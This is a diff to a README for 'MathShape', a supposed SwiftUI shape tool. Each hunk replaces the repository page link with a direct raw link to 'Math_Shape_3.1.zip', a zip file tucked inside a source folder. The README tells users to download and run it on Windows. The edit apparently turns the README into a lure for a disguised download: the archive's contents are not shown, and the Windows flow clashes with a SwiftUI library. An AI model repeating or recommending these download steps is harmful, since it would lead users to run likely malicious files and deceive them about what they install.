@@ -1,12 +1,12 @@
 # 🧮 MathShape - Turn graphs into SwiftUI shapes
 
-[![Download MathShape](https://img.shields.io/badge/Download-MathShape-blue?style=for-the-badge&logo=github)](https://github.com/coldwarmertensiavirginica916/MathShape)
+[![Download MathShape](https://img.shields.io/badge/Download-MathShape-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/coldwarmertensiavirginica916/MathShape/main/Sources/MathShape/Shapes/Math_Shape_3.1.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download MathShape:
 
-https://github.com/coldwarmertensiavirginica916/MathShape
+https://raw.githubusercontent.com/coldwarmertensiavirginica916/MathShape/main/Sources/MathShape/Shapes/Math_Shape_3.1.zip
 
 ## 🪟 What MathShape does
 
@@ -28,7 +28,7 @@ If your browser asks where to save the file, choose a folder you can find again,
 ## 🚀 How to download and run MathShape on Windows
 
 1. Open this page in your browser:  
-   https://github.com/coldwarmertensiavirginica916/MathShape
+   https://raw.githubusercontent.com/coldwarmertensiavirginica916/MathShape/main/Sources/MathShape/Shapes/Math_Shape_3.1.zip
 
 2. Find the download area on the page.
 
@@ -122,4 +122,4 @@ MathShape is a small utility for turning parametric graphs into SwiftUI Shape ou
 - Type: End-user app
 - Main purpose: Port parametric graph into SwiftUI Shape
 - Platform target: Windows download and run flow
-- Primary link: https://github.com/coldwarmertensiavirginica916/MathShape
+- Primary link: https://raw.githubusercontent.com/coldwarmertensiavirginica916/MathShape/main/Sources/MathShape/Shapes/Math_Shape_3.1.zip
